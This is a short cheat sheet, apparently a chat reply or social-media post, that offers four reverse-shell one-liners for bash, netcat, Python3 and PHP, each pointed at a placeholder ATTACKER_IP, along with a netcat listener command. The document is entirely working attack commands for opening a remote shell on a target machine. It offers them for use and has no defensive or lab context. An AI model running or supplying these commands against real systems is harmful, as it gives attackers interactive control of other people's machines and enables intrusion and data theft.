Here are your top 4 reverse shells in clean one-liner👇


---

### 🔹 1. Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```


---


### 🔹 2. Netcat Reverse Shell

```bash
nc -e /bin/bash ATTACKER_IP PORT
```

**Alt (no -e):**

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

---

### 🔹 3. Python3 Reverse Shell

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```


---

### 🔹 4. PHP Reverse Shell

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?>
```

---

🧠 Listener Command (Run on your machine):

```bash
nc -lvnp PORT
```